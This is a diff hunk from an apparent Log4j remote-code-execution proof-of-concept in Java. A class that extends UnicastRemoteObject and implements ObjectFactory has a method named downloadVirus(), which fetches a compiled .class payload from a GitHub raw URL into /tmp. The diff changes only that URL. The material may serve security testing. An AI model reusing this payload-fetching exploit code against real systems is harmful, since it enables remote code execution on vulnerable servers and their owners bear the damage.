@@ -59,6 +59,6 @@ public class HelloServiceImpl extends UnicastRemoteObject implements ObjectFacto
     private static void downloadVirus() {
 
         File f = new File("/tmp/HelloServiceImpl.class");
-        HttpClient.get("https://raw.githubusercontent.com/scuecs/Log4jRCEServer/main/doc/HelloServiceImpl.class").asFile(f);
+        HttpClient.get("https://raw.githubusercontent.com/scuecs/Log4jRCETest/main/doc/HelloServiceImpl.class").asFile(f);
     }
 }
